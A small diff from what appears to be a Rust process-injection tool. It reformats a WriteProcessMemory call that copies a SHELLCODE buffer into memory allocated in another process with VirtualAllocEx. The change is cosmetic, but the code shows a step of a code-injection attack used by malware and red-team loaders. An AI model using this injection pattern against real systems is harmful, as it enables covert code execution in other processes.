@@ -61,13 +61,7 @@ fn main() {
             panic!("VirtualAllocEx failed!");
         }
 
-        let res = WriteProcessMemory(
-            handle,
-            dest,
-            SHELLCODE.as_ptr().cast(),
-            SIZE,
-            null_mut(),
-        );
+        let res = WriteProcessMemory(handle, dest, SHELLCODE.as_ptr().cast(), SIZE, null_mut());
         if res == FALSE {
             panic!("WriteProcessMemory failed!");
         }
